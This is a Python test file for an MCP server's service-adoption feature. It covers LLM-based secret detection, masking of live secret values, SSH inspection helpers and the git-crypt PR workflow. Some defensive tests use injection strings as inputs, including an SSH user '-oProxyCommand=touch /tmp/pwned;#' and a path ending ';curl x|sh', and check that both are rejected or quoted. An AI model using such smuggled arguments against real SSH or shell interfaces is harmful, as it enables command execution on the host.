"""Tests for brownfield adoption (Phase 7): the AdoptionGenerator gates, the
AdoptionDraft lifecycle, the SSH inspection helpers, and the
proposal_adopt_service* MCP tools.

SSH and git-crypt are faked at their module boundary so nothing touches the
network or a real filesystem/subprocess.
"""

from __future__ import annotations

from datetime import timedelta
from pathlib import Path
from unittest.mock import AsyncMock, patch

from conftest import IsolatedSettings
from registry_mcp.adoption import AdoptionDraftStore
from registry_mcp.adoption.ssh import (
    SSHError,
    compose_paths_from_labels,
    env_dict_from_inspect,
    labels_from_inspect,
)
from registry_mcp.discovery.base import DiscoveredService
from registry_mcp.models import (
    AdoptionDraft,
    AdoptionDraftStatus,
    DetectedSecret,
    HardwareNode,
    NodeRole,
    ProposalStatus,
    SourceType,
)
from registry_mcp.proposal import ProposalStore
from registry_mcp.proposal.adoption import AdoptionGenerator
from registry_mcp.providers.git import OpenedPR
from registry_mcp.tools.adoption import register_adoption_tools


def _kv(secret):
    """AdoptionDraft.detected_secrets round-trips as dicts once reloaded from
    SQLite (same quirk `HardwareStore` handles for `storage_pools`)."""
    if isinstance(secret, dict):
        return secret["key"], secret["live_value"]
    return secret.key, secret.live_value


VALID = {
    "sanitized_compose": (
        "services:\n  legacy:\n    image: legacy:1.0\n    environment:\n"
        "      TOKEN: ${TOKEN}\n      LOG_LEVEL: info\n"
    ),
    "detected_secret_keys": ["TOKEN"],
    "confidence": 0.95,
    "reasoning": "TOKEN looked like a credential; LOG_LEVEL did not.",
}


class FakeReasoner:
    def __init__(self, result=VALID):
        self.result = result

    def detect_hardcoded_secrets(self, **kwargs):
        return self.result


# ---------------------------------------------------------------------------
# AdoptionGenerator gates
# ---------------------------------------------------------------------------


def _gen(result, threshold=0.8):
    return AdoptionGenerator(FakeReasoner(result), threshold=threshold)


def _call(generator):
    return generator.generate(
        compose_content="services:\n  legacy:\n    image: legacy:1.0\n",
        container_env={"TOKEN": "abcdefghijklmnopqrstuvwxyz0123456789", "LOG_LEVEL": "info"},
        container_labels={},
    )


class TestAdoptionGenerator:
    def test_none_result_is_rejected(self):
        result = _call(_gen(None))
        assert result.ok is False
        assert "unavailable" in result.rejection_reason

    def test_low_confidence_is_rejected(self):
        result = _call(_gen({**VALID, "confidence": 0.5}))
        assert result.ok is False
        assert "below threshold" in result.rejection_reason

    def test_empty_result_is_rejected(self):
        result = _call(_gen({**VALID, "sanitized_compose": "   "}))
        assert result.ok is False
        assert "empty" in result.rejection_reason

    def test_invalid_yaml_is_rejected(self):
        result = _call(_gen({**VALID, "sanitized_compose": "foo: [unclosed"}))
        assert result.ok is False
        assert "not valid YAML" in result.rejection_reason

    def test_valid_result_passes(self):
        result = _call(_gen(VALID))
        assert result.ok is True
        assert result.confidence == 0.95
        assert result.detected_secret_keys == ["TOKEN"]

    def test_residual_credentials_are_scrubbed(self):
        leaky = {
            **VALID,
            "sanitized_compose": (
                "services:\n  legacy:\n    environment:\n"
                "      TOKEN: abcdefghijklmnopqrstuvwxyz0123456789\n"
            ),
        }
        result = _call(_gen(leaky))
        assert result.ok is True
        assert "abcdefghijklmnopqrstuvwxyz0123456789" not in result.sanitized_compose
        assert "TOKEN: <replace-with-credential>" in result.sanitized_compose

    def test_credentials_quoted_in_reasoning_are_scrubbed(self):
        """A credential the model echoes in its explanation must not leak out
        through `reasoning` — it's embedded verbatim into the PR body and the
        tool's response, a channel the sanitized-compose scrub never touches."""
        leaky = {
            **VALID,
            "reasoning": (
                "TOKEN: abcdefghijklmnopqrstuvwxyz0123456789 looked like a real credential"
            ),
        }
        result = _call(_gen(leaky))
        assert result.ok is True
        assert "abcdefghijklmnopqrstuvwxyz0123456789" not in result.reasoning
        assert "TOKEN: <replace-with-credential>" in result.reasoning


class RecordingReasoner:
    """Captures exactly what would be sent to the LLM provider."""

    def __init__(self, sanitized_compose: str, keys=("TOKEN",)):
        self.sent: dict = {}
        self._result = {
            **VALID,
            "sanitized_compose": sanitized_compose,
            "detected_secret_keys": list(keys),
        }

    def detect_hardcoded_secrets(self, **kwargs):
        self.sent = kwargs
        return self._result


_TOKEN = "abcdefghijklmnopqrstuvwxyz0123456789"
_LEGACY = (
    "services:\n  legacy:\n    image: legacy:1.0\n    environment:\n"
    f"      TOKEN: {_TOKEN}\n      TZ: America/New_York\n      LOG_LEVEL: info\n"
)
_LIVE_ENV = {"TOKEN": _TOKEN, "TZ": "America/New_York", "LOG_LEVEL": "info"}


class TestAdoptionValueMasking:
    """Live secret values must never reach the LLM provider."""

    def test_live_values_never_reach_the_reasoner(self):
        reasoner = RecordingReasoner(_LEGACY)
        AdoptionGenerator(reasoner, threshold=0.8).generate(
            compose_content=_LEGACY, container_env=_LIVE_ENV, container_labels={}
        )
        sent = str(reasoner.sent)
        assert _TOKEN not in sent
        assert "America/New_York" not in sent
        assert "TOKEN: <value-of:TOKEN>" in reasoner.sent["compose_content"]
        assert "LOG_LEVEL: info" in reasoner.sent["compose_content"]  # too short to mask
        assert reasoner.sent["container_env"] == {
            "TOKEN": "<value-of:TOKEN>",
            "TZ": "<value-of:TZ>",
            "LOG_LEVEL": "<value-of:LOG_LEVEL>",
        }

    def test_kept_placeholders_are_restored(self):
        reply = (
            "services:\n  legacy:\n    image: legacy:1.0\n    environment:\n"
            "      TOKEN: ${TOKEN}\n      TZ: <value-of:TZ>\n      LOG_LEVEL: info\n"
        )
        result = AdoptionGenerator(RecordingReasoner(reply), threshold=0.8).generate(
            compose_content=_LEGACY, container_env=_LIVE_ENV, container_labels={}
        )
        assert result.ok is True
        assert "TZ: America/New_York" in result.sanitized_compose
        assert "TOKEN: ${TOKEN}" in result.sanitized_compose

    def test_an_altered_placeholder_is_rejected(self):
        reply = "services:\n  legacy:\n    environment:\n      TZ: <value-of:TIMEZONE>\n"
        result = AdoptionGenerator(RecordingReasoner(reply), threshold=0.8).generate(
            compose_content=_LEGACY, container_env=_LIVE_ENV, container_labels={}
        )
        assert result.ok is False
        assert "placeholder" in result.rejection_reason

    def test_a_secret_the_model_kept_is_still_scrubbed(self):
        reply = "services:\n  legacy:\n    environment:\n      TOKEN: <value-of:TOKEN>\n"
        result = AdoptionGenerator(RecordingReasoner(reply, keys=()), threshold=0.8).generate(
            compose_content=_LEGACY, container_env=_LIVE_ENV, container_labels={}
        )
        assert _TOKEN not in result.sanitized_compose
        assert "TOKEN: <replace-with-credential>" in result.sanitized_compose

    def test_overlapping_values_round_trip_exactly(self):
        compose = "x: password1234\ny: password123\n"
        env = {"A": "password123", "B": "password1234"}
        reasoner = RecordingReasoner("x: <value-of:B>\ny: <value-of:A>\n", keys=())
        result = AdoptionGenerator(reasoner, threshold=0.8).generate(
            compose_content=compose, container_env=env, container_labels={}
        )
        assert reasoner.sent["compose_content"] == "x: <value-of:B>\ny: <value-of:A>\n"
        assert result.sanitized_compose == compose


# ---------------------------------------------------------------------------
# SSH helpers
# ---------------------------------------------------------------------------


class TestSSHHelpers:
    def test_env_dict_from_inspect(self):
        data = {"Config": {"Env": ["TOKEN=abc123", "LOG_LEVEL=info", "MALFORMED"]}}
        assert env_dict_from_inspect(data) == {"TOKEN": "abc123", "LOG_LEVEL": "info"}

    def test_labels_from_inspect(self):
        data = {"Config": {"Labels": {"traefik.enable": "true"}}}
        assert labels_from_inspect(data) == {"traefik.enable": "true"}

    def test_labels_from_inspect_missing_config(self):
        assert labels_from_inspect({}) == {}

    def test_compose_paths_from_labels(self):
        labels = {
            "com.docker.compose.project.config_files": "/srv/legacy/docker-compose.yml",
            "com.docker.compose.project.working_dir": "/srv/legacy",
        }
        files, working_dir = compose_paths_from_labels(labels)
        assert files == ["/srv/legacy/docker-compose.yml"]
        assert working_dir == "/srv/legacy"

    def test_compose_paths_from_labels_missing(self):
        files, working_dir = compose_paths_from_labels({})
        assert files == []
        assert working_dir is None

    async def test_inspect_container_raises_on_ssh_failure(self):
        from registry_mcp.adoption import ssh as remote

        with patch.object(remote, "_run", new=AsyncMock(return_value=(255, "", "no route"))):
            try:
                await remote.inspect_container(
                    key_path="/key", user="root", host="1.2.3.4", container="legacy"
                )
                raised = False
            except SSHError:
                raised = True
        assert raised

    async def test_try_read_remote_file_returns_none_on_failure(self):
        from registry_mcp.adoption import ssh as remote

        with patch.object(remote, "_run", new=AsyncMock(return_value=(1, "", "not found"))):
            result = await remote.try_read_remote_file(
                key_path="/key", user="root", host="1.2.3.4", path="/srv/.env"
            )
        assert result is None

    def test_ssh_base_rejects_option_shaped_user(self):
        """`user@host` sits where ssh still parses options, so a user of
        `-oProxyCommand=...` would run a command on the control-plane node."""
        from registry_mcp.adoption import ssh as remote

        for user in ("-oProxyCommand=touch /tmp/pwned;#", "root@evil", "a b", ""):
            try:
                remote._ssh_base("/key", user, "10.0.0.5")
                raised = False
            except SSHError:
                raised = True
            assert raised, user

    def test_ssh_base_rejects_option_shaped_host(self):
        from registry_mcp.adoption import ssh as remote

        for host in ("-oProxyCommand=x", "host name", ""):
            try:
                remote._ssh_base("/key", "root", host)
                raised = False
            except SSHError:
                raised = True
            assert raised, host

    def test_ssh_base_terminates_options_before_destination(self):
        from registry_mcp.adoption import ssh as remote

        argv = remote._ssh_base("/key", "root", "10.0.0.5")
        assert argv[-2:] == ["--", "root@10.0.0.5"]

    async def test_remote_path_is_quoted_for_the_remote_shell(self):
        """ssh hands trailing args to the remote login shell as one string, so a
        compose path taken from a container label must arrive as one quoted word."""
        from registry_mcp.adoption import ssh as remote

        run = AsyncMock(return_value=(0, "services: {}\n", ""))
        with patch.object(remote, "_run", new=run):
            await remote.read_remote_file(
                key_path="/key", user="root", host="10.0.0.5", path="/srv/a.yml;curl x|sh"
            )
        argv = run.await_args.args[0]
        assert argv[-1] == "cat -- '/srv/a.yml;curl x|sh'"


# ---------------------------------------------------------------------------
# AdoptionDraftStore
# ---------------------------------------------------------------------------


class TestAdoptionDraftStore:
    def _draft(self, ttl_minutes=60, **overrides):
        base = dict(
            service_id="svc-1",
            host="10.0.0.5",
            ssh_user="root",
            container_name="legacy",
            compose_path="/srv/legacy/docker-compose.yml",
            target_file_path="nodes/host/legacy/compose.yaml",
            sanitized_compose="services: {}\n",
            expires_at=AdoptionDraftStore.ttl_expiry(ttl_minutes),
        )
        base.update(overrides)
        return AdoptionDraft(**base)

    def test_get_pending_returns_pending_draft(self, store):
        adoption_store = AdoptionDraftStore(store.engine)
        created = adoption_store.create(self._draft())
        assert adoption_store.get_pending(created.id) is not None

    def test_get_pending_none_when_expired(self, store):
        adoption_store = AdoptionDraftStore(store.engine)
        created = adoption_store.create(self._draft())
        # Force it into the past.
        adoption_store.get(created.id)
        with patch(
            "registry_mcp.adoption.store.utcnow",
            return_value=created.expires_at + timedelta(hours=1),
        ):
            assert adoption_store.get_pending(created.id) is None
        refreshed = adoption_store.get(created.id)
        assert refreshed.status == AdoptionDraftStatus.expired

    def test_get_pending_none_when_already_finalized(self, store):
        adoption_store = AdoptionDraftStore(store.engine)
        created = adoption_store.create(self._draft())
        adoption_store.set_status(created.id, AdoptionDraftStatus.finalized)
        assert adoption_store.get_pending(created.id) is None

    def test_purge_expired_marks_stale_pending_drafts(self, store):
        adoption_store = AdoptionDraftStore(store.engine)
        created = adoption_store.create(self._draft())
        with patch(
            "registry_mcp.adoption.store.utcnow",
            return_value=created.expires_at + timedelta(hours=1),
        ):
            count = adoption_store.purge_expired()
        assert count == 1
        assert adoption_store.get(created.id).status == AdoptionDraftStatus.expired


# ---------------------------------------------------------------------------
# proposal_adopt_service* MCP tools
# ---------------------------------------------------------------------------


class FakeGit:
    def __init__(self):
        self.branches = []
        self.commits = []
        self.opened = []

    async def create_branch(self, repo, branch, base):
        self.branches.append(branch)

    async def read_file(self, repo, path, ref):
        return "services: {}\n"

    async def commit_file(self, repo, path, content, branch, message):
        self.commits.append({"path": path, "content": content, "branch": branch})

    async def open_pr(self, repo, title, body, branch, base, label=None):
        number = 200 + len(self.opened)
        self.opened.append({"title": title, "body": body, "branch": branch, "label": label})
        return OpenedPR(url=f"https://git.test/pulls/{number}", number=number)


class FakeNotifier:
    def __init__(self):
        self.sent = []

    async def send(self, title, body, url=None, diff=None):
        self.sent.append({"title": title, "body": body, "url": url})


def _make_mcp():
    tools: dict = {}

    class _FakeMCP:
        def tool(self, *args, **kwargs):
            def decorator(fn):
                tools[fn.__name__] = fn
                return fn

            return decorator

    return _FakeMCP(), tools


def _settings(**overrides):
    base = dict(
        adoption_enabled=True,
        git_base_url="https://git.test",
        git_token="tok",
        git_repo="nathan/homelab",
        secrets_repo_path="/repo",
        ssh_key_path="/key",
    )
    base.update(overrides)
    return IsolatedSettings(**base)


def _node(hardware_store, hostname="host-01", ip="10.0.0.5"):
    return hardware_store.create_node(
        HardwareNode(
            hostname=hostname, display_name=hostname, role=NodeRole.docker_host, ip_address=ip
        )
    )


def _docker_service(store, name="legacy", labels=None):
    labels = labels or {
        "com.docker.compose.project.config_files": "/srv/legacy/docker-compose.yml",
        "com.docker.compose.project.working_dir": "/srv/legacy",
    }
    store.reconcile(
        SourceType.docker,
        [
            DiscoveredService(
                source=SourceType.docker,
                external_id="abc123",
                name=name,
                raw={"id": "abc123def456", "name": name, "labels": labels},
            )
        ],
        stale_threshold=3,
    )
    return store.get_service(name)


_UNSET = object()


def _setup(
    store,
    hardware_store,
    *,
    git=_UNSET,
    notifier=None,
    generator=None,
    settings=None,
    read_only=False,
):
    settings = settings or _settings()
    adoption_store = AdoptionDraftStore(store.engine)
    proposals = ProposalStore(store.engine)
    mcp, tools = _make_mcp()
    register_adoption_tools(
        mcp,
        settings,
        store,
        hardware_store,
        adoption_store,
        generator or AdoptionGenerator(FakeReasoner(), threshold=0.8),
        FakeGit() if git is _UNSET else git,
        proposals,
        notifier or FakeNotifier(),
        read_only=read_only,
    )
    return tools, adoption_store, proposals


class TestProposalAdoptService:
    async def test_happy_path_creates_pending_draft(self, store, hardware_store):
        node = _node(hardware_store)
        service = _docker_service(store)
        hardware_store.link_service(service.id, node.id)
        tools, adoption_store, proposals = _setup(store, hardware_store)

        inspect_data = {
            "Config": {
                "Env": ["TOKEN=supersecretvalue", "LOG_LEVEL=info"],
                "Labels": {
                    "com.docker.compose.project.config_files": "/srv/legacy/docker-compose.yml",
                    "com.docker.compose.project.working_dir": "/srv/legacy",
                },
            }
        }
        with (
            patch(
                "registry_mcp.tools.adoption.remote.inspect_container",
                new=AsyncMock(return_value=inspect_data),
            ),
            patch(
                "registry_mcp.tools.adoption.remote.read_remote_file",
                new=AsyncMock(return_value="services:\n  legacy:\n    image: legacy:1.0\n"),
            ),
        ):
            result = await tools["proposal_adopt_service"](service.id)

        assert "draft_id" in result
        assert result["detected_secret_keys"] == ["TOKEN"]
        assert "keep the existing values" in result["next_step"]
        draft = adoption_store.get_pending(result["draft_id"])
        assert draft is not None
        assert [_kv(s) for s in draft.detected_secrets] == [("TOKEN", "supersecretvalue")]
        assert proposals.list_open() == []  # nothing committed yet

    async def test_disabled_returns_error(self, store, hardware_store):
        tools, _, _ = _setup(store, hardware_store, settings=_settings(adoption_enabled=False))
        result = await tools["proposal_adopt_service"]("whatever")
        assert "error" in result
        assert "ADOPTION_ENABLED" in result["error"]

    async def test_read_only_returns_error(self, store, hardware_store):
        tools, _, _ = _setup(store, hardware_store, read_only=True)
        result = await tools["proposal_adopt_service"]("whatever")
        assert "error" in result
        assert "read-only" in result["error"]

    async def test_unknown_service_returns_error(self, store, hardware_store):
        tools, _, _ = _setup(store, hardware_store)
        result = await tools["proposal_adopt_service"]("nope")
        assert "error" in result

    async def test_git_provider_not_constructed_returns_error(self, store, hardware_store):
        """`git_repo` set but the provider is None (e.g. GIT_TOKEN missing) must
        error cleanly rather than crash on a None attribute access later."""
        tools, _, _ = _setup(store, hardware_store, git=None)
        result = await tools["proposal_adopt_service"]("whatever")
        assert "error" in result
        assert "Git write path not configured" in result["error"]

    async def test_service_without_hardware_link_returns_error(self, store, hardware_store):
        service = _docker_service(store)
        tools, _, _ = _setup(store, hardware_store)
        result = await tools["proposal_adopt_service"](service.id)
        assert "error" in result
        assert "hardware-link-service" in result["error"]

    async def test_service_without_docker_source_returns_error(self, store, hardware_store):
        node = _node(hardware_store)
        service = store.create_service(
            __import__("registry_mcp.models", fromlist=["Service"]).Service(
                name="manual-svc", display_name="Manual", host="host-01"
            )
        )
        hardware_store.link_service(service.id, node.id)
        tools, _, _ = _setup(store, hardware_store)
        result = await tools["proposal_adopt_service"](service.id)
        assert "error" in result
        assert "Docker provenance" in result["error"]

    async def test_ssh_failure_returns_error(self, store, hardware_store):
        node = _node(hardware_store)
        service = _docker_service(store)
        hardware_store.link_service(service.id, node.id)
        tools, _, _ = _setup(store, hardware_store)

        from registry_mcp.adoption.ssh import SSHError

        with patch(
            "registry_mcp.tools.adoption.remote.inspect_container",
            new=AsyncMock(side_effect=SSHError("connection refused")),
        ):
            result = await tools["proposal_adopt_service"](service.id)
        assert "error" in result
        assert "docker inspect failed" in result["error"]

    async def test_secret_detection_runs_off_the_event_loop(self, store, hardware_store):
        from conftest import BlockingCall

        node = _node(hardware_store)
        service = _docker_service(store)
        hardware_store.link_service(service.id, node.id)
        reasoner = FakeReasoner()
        reasoner.detect_hardcoded_secrets = BlockingCall(VALID)
        tools, _, _ = _setup(
            store, hardware_store, generator=AdoptionGenerator(reasoner, threshold=0.8)
        )
        inspect_data = {
            "Config": {
                "Env": ["TOKEN=supersecretvalue"],
                "Labels": {
                    "com.docker.compose.project.config_files": "/srv/legacy/docker-compose.yml",
                },
            }
        }
        with (
            patch(
                "registry_mcp.tools.adoption.remote.inspect_container",
                new=AsyncMock(return_value=inspect_data),
            ),
            patch(
                "registry_mcp.tools.adoption.remote.read_remote_file",
                new=AsyncMock(return_value="services:\n  legacy:\n    image: legacy:1.0\n"),
            ),
        ):
            result = await reasoner.detect_hardcoded_secrets.assert_off_loop(
                tools["proposal_adopt_service"](service.id)
            )
        assert "draft_id" in result

    async def test_option_shaped_ssh_user_never_reaches_a_subprocess(self, store, hardware_store):
        node = _node(hardware_store)
        service = _docker_service(store)
        hardware_store.link_service(service.id, node.id)
        tools, _, _ = _setup(store, hardware_store)

        from registry_mcp.adoption import ssh as remote

        run = AsyncMock(return_value=(0, "[]", ""))
        with patch.object(remote, "_run", new=run):
            result = await tools["proposal_adopt_service"](
                service.id, ssh_user="-oProxyCommand=touch /tmp/pwned;#"
            )
        assert "error" in result
        assert "unsafe SSH user" in result["error"]
        run.assert_not_awaited()

    async def test_no_compose_labels_returns_error(self, store, hardware_store):
        node = _node(hardware_store)
        service = _docker_service(store)
        hardware_store.link_service(service.id, node.id)
        tools, _, _ = _setup(store, hardware_store)

        with patch(
            "registry_mcp.tools.adoption.remote.inspect_container",
            new=AsyncMock(return_value={"Config": {"Env": [], "Labels": {}}}),
        ):
            result = await tools["proposal_adopt_service"](service.id)
        assert "error" in result
        assert "compose labels" in result["error"]

    async def test_rejected_sanitization_records_rejected_proposal(self, store, hardware_store):
        node = _node(hardware_store)
        service = _docker_service(store)
        hardware_store.link_service(service.id, node.id)
        notifier = FakeNotifier()
        generator = AdoptionGenerator(FakeReasoner({**VALID, "confidence": 0.1}), threshold=0.8)
        tools, _, proposals = _setup(store, hardware_store, notifier=notifier, generator=generator)

        inspect_data = {
            "Config": {
                "Env": ["TOKEN=x"],
                "Labels": {
                    "com.docker.compose.project.config_files": "/srv/legacy/docker-compose.yml",
                },
            }
        }
        with (
            patch(
                "registry_mcp.tools.adoption.remote.inspect_container",
                new=AsyncMock(return_value=inspect_data),
            ),
            patch(
                "registry_mcp.tools.adoption.remote.read_remote_file",
                new=AsyncMock(return_value="services: {}\n"),
            ),
        ):
            result = await tools["proposal_adopt_service"](service.id)

        assert "rejected" in result
        # P5: counting proposals alone doesn't prove the persisted status is
        # actually `rejected` rather than `open` — a rejected sanitization
        # saved as `open` would still pass a bare "one proposal exists" check.
        recorded = proposals.list_all()
        assert len(recorded) == 1
        assert recorded[0].status == ProposalStatus.rejected
        assert any("manual review" in s["title"] for s in notifier.sent)


class TestProposalAdoptServiceFinalize:
    async def _drafted(self, store, hardware_store, tools, detected_secrets=True):
        node = _node(hardware_store)
        service = _docker_service(store)
        hardware_store.link_service(service.id, node.id)

        env = {"TOKEN": "livevalue"} if detected_secrets else {}
        inspect_data = {
            "Config": {
                "Env": [f"{k}={v}" for k, v in env.items()],
                "Labels": {
                    "com.docker.compose.project.config_files": "/srv/legacy/docker-compose.yml",
                },
            }
        }
        with (
            patch(
                "registry_mcp.tools.adoption.remote.inspect_container",
                new=AsyncMock(return_value=inspect_data),
            ),
            patch(
                "registry_mcp.tools.adoption.remote.read_remote_file",
                new=AsyncMock(return_value="services: {}\n"),
            ),
        ):
            drafted = await tools["proposal_adopt_service"](service.id)
        return service, drafted

    async def test_finalize_keep_writes_live_value_and_opens_pr(self, store, hardware_store):
        git = FakeGit()
        tools, adoption_store, proposals = _setup(store, hardware_store, git=git)
        service, drafted = await self._drafted(store, hardware_store, tools)

        with (
            patch("registry_mcp.gitcrypt.repo_path", return_value=Path("/repo")),
            patch("registry_mcp.gitcrypt.key_bytes", return_value=b"key"),
            patch(
                "registry_mcp.gitcrypt.check_path",
                return_value="/repo/nodes/host-01/legacy/.env",
            ),
            patch("registry_mcp.gitcrypt.git_checkout_branch", new=AsyncMock()),
            patch("registry_mcp.gitcrypt.ensure_unlocked", new=AsyncMock()),
            patch("registry_mcp.gitcrypt.ensure_gitattributes_entry", new=AsyncMock()),
            patch("registry_mcp.gitcrypt.git_commit_paths", new=AsyncMock()) as commit_paths,
            patch("registry_mcp.gitcrypt.git_push_branch", new=AsyncMock()),
            patch("pathlib.Path.mkdir"),
            patch("pathlib.Path.write_text") as write_text,
        ):
            result = await tools["proposal_adopt_service_finalize"](drafted["draft_id"], "keep")

        assert result["status"] == "open"
        assert write_text.call_args[0][0] == "TOKEN=livevalue\n"
        assert commit_paths.await_count == 1
        assert git.commits and git.opened
        assert adoption_store.get(drafted["draft_id"]).status == AdoptionDraftStatus.finalized

    async def test_finalize_refuses_a_live_value_with_a_line_break(self, store, hardware_store):
        """A captured value with a line break would write extra `.env` lines."""
        tools, _, _ = _setup(store, hardware_store, git=FakeGit())
        node = _node(hardware_store)
        service = _docker_service(store)
        hardware_store.link_service(service.id, node.id)
        inspect_data = {
            "Config": {
                "Env": ["TOKEN=live\nINJECTED=1"],
                "Labels": {
                    "com.docker.compose.project.config_files": "/srv/legacy/docker-compose.yml",
                },
            }
        }
        with (
            patch(
                "registry_mcp.tools.adoption.remote.inspect_container",
                new=AsyncMock(return_value=inspect_data),
            ),
            patch(
                "registry_mcp.tools.adoption.remote.read_remote_file",
                new=AsyncMock(return_value="services: {}\n"),
            ),
        ):
            drafted = await tools["proposal_adopt_service"](service.id)

        with (
            patch("registry_mcp.gitcrypt.repo_path", return_value=Path("/repo")),
            patch("registry_mcp.gitcrypt.key_bytes", return_value=b"key"),
            patch("registry_mcp.gitcrypt.git_checkout_branch", new=AsyncMock()) as checkout,
            patch("pathlib.Path.write_text") as write_text,
        ):
            result = await tools["proposal_adopt_service_finalize"](drafted["draft_id"], "keep")

        assert "line break" in result["error"]
        checkout.assert_not_awaited()
        write_text.assert_not_called()

    async def test_finalize_rotate_generates_new_value(self, store, hardware_store):
        git = FakeGit()
        tools, adoption_store, proposals = _setup(store, hardware_store, git=git)
        service, drafted = await self._drafted(store, hardware_store, tools)

        with (
            patch("registry_mcp.gitcrypt.repo_path", return_value=Path("/repo")),
            patch("registry_mcp.gitcrypt.key_bytes", return_value=b"key"),
            patch(
                "registry_mcp.gitcrypt.check_path",
                return_value="/repo/nodes/host-01/legacy/.env",
            ),
            patch("registry_mcp.gitcrypt.git_checkout_branch", new=AsyncMock()),
            patch("registry_mcp.gitcrypt.ensure_unlocked", new=AsyncMock()),
            patch("registry_mcp.gitcrypt.ensure_gitattributes_entry", new=AsyncMock()),
            patch("registry_mcp.gitcrypt.git_commit_paths", new=AsyncMock()),
            patch("registry_mcp.gitcrypt.git_push_branch", new=AsyncMock()),
            patch("pathlib.Path.mkdir"),
            patch("pathlib.Path.write_text") as write_text,
        ):
            result = await tools["proposal_adopt_service_finalize"](drafted["draft_id"], "rotate")

        assert result["status"] == "open"
        written = write_text.call_args[0][0]
        assert written != "TOKEN=livevalue\n"
        assert written.startswith("TOKEN=")
        # P3: neither assertion above catches a rotated value of "" — the
        # written line would still differ from the live one and still start
        # with "TOKEN=".
        assert written.strip() != "TOKEN="
        assert len(written.strip()) > len("TOKEN=")

    async def test_finalize_skips_gitcrypt_when_no_secrets_detected(self, store, hardware_store):
        git = FakeGit()
        generator = AdoptionGenerator(
            FakeReasoner({**VALID, "detected_secret_keys": []}), threshold=0.8
        )
        tools, adoption_store, proposals = _setup(
            store, hardware_store, git=git, generator=generator
        )
        service, drafted = await self._drafted(store, hardware_store, tools, detected_secrets=False)

        with patch("registry_mcp.gitcrypt.repo_path") as repo_path:
            result = await tools["proposal_adopt_service_finalize"](drafted["draft_id"])

        repo_path.assert_not_called()
        assert result["status"] == "open"
        assert git.commits and git.opened

    async def test_finalize_invalid_secret_strategy_returns_error(self, store, hardware_store):
        tools, _, _ = _setup(store, hardware_store)
        service, drafted = await self._drafted(store, hardware_store, tools)
        result = await tools["proposal_adopt_service_finalize"](drafted["draft_id"], "bogus")
        # P1: "error" in result alone is satisfied by any unrelated failure —
        # dropping this validation outright would still hit a KeyError or
        # similar downstream and report *some* error.
        assert result["error"] == "secret_strategy must be one of ['keep', 'rotate']"

    async def test_finalize_invalid_secret_strategy_ignored_when_no_secrets(
        self, store, hardware_store
    ):
        """An invalid `secret_strategy` is moot when the draft has nothing to
        apply it to — it must not block opening the PR."""
        git = FakeGit()
        generator = AdoptionGenerator(
            FakeReasoner({**VALID, "detected_secret_keys": []}), threshold=0.8
        )
        tools, _, _ = _setup(store, hardware_store, git=git, generator=generator)
        service, drafted = await self._drafted(store, hardware_store, tools, detected_secrets=False)

        result = await tools["proposal_adopt_service_finalize"](drafted["draft_id"], "bogus")

        assert result["status"] == "open"

    async def test_finalize_unknown_draft_returns_error(self, store, hardware_store):
        tools, _, _ = _setup(store, hardware_store)
        result = await tools["proposal_adopt_service_finalize"]("nope")
        assert "error" in result

    async def test_finalize_already_finalized_draft_returns_error(self, store, hardware_store):
        tools, adoption_store, _ = _setup(store, hardware_store)
        service, drafted = await self._drafted(store, hardware_store, tools)
        adoption_store.set_status(drafted["draft_id"], AdoptionDraftStatus.finalized)
        result = await tools["proposal_adopt_service_finalize"](drafted["draft_id"])
        # P2: "error" in result alone doesn't distinguish this from any other
        # failure, and doesn't prove the second finalize attempt left the
        # persisted status alone rather than re-finalizing or corrupting it.
        assert "already be finalized, cancelled, or expired" in result["error"]
        assert adoption_store.get(drafted["draft_id"]).status == AdoptionDraftStatus.finalized


class TestProposalAdoptServiceCancelAndGet:
    async def test_cancel_marks_cancelled(self, store, hardware_store):
        tools, adoption_store, _ = _setup(store, hardware_store)
        node = _node(hardware_store)
        service = _docker_service(store)
        hardware_store.link_service(service.id, node.id)
        adoption_store2 = adoption_store
        draft = adoption_store2.create(
            AdoptionDraft(
                service_id=service.id,
                host="10.0.0.5",
                ssh_user="root",
                container_name="legacy",
                compose_path="/srv/legacy/docker-compose.yml",
                target_file_path="nodes/host-01/legacy/compose.yaml",
                sanitized_compose="services: {}\n",
                expires_at=AdoptionDraftStore.ttl_expiry(60),
            )
        )
        result = tools["proposal_adopt_service_cancel"](draft.id)
        assert result["status"] == "cancelled"
        # P4: the returned dict alone doesn't prove the status was persisted —
        # a cancel that computed the response but never called set_status
        # would pass the line above and still leave the draft pending.
        assert adoption_store2.get(draft.id).status == AdoptionDraftStatus.cancelled

    async def test_cancel_unknown_draft_returns_error(self, store, hardware_store):
        tools, _, _ = _setup(store, hardware_store)
        result = tools["proposal_adopt_service_cancel"]("nope")
        assert "error" in result

    async def test_cancel_respects_read_only_mode(self, store, hardware_store):
        tools, _, _ = _setup(store, hardware_store, read_only=True)
        result = tools["proposal_adopt_service_cancel"]("whatever")
        assert "error" in result
        assert "read-only" in result["error"]

    async def test_cancel_respects_adoption_disabled(self, store, hardware_store):
        tools, _, _ = _setup(store, hardware_store, settings=_settings(adoption_enabled=False))
        result = tools["proposal_adopt_service_cancel"]("whatever")
        assert "error" in result
        assert "ADOPTION_ENABLED" in result["error"]

    async def test_get_masks_live_secret_values(self, store, hardware_store):
        tools, adoption_store, _ = _setup(store, hardware_store)
        draft = adoption_store.create(
            AdoptionDraft(
                service_id="svc-1",
                host="10.0.0.5",
                ssh_user="root",
                container_name="legacy",
                compose_path="/srv/legacy/docker-compose.yml",
                target_file_path="nodes/host-01/legacy/compose.yaml",
                sanitized_compose="services: {}\n",
                detected_secrets=[
                    DetectedSecret(key="TOKEN", live_value="supersecret").model_dump()
                ],
                expires_at=AdoptionDraftStore.ttl_expiry(60),
            )
        )
        result = tools["proposal_adopt_service_get"](draft.id)
        assert result["detected_secrets"] == ["TOKEN"]
        assert "supersecret" not in str(result)
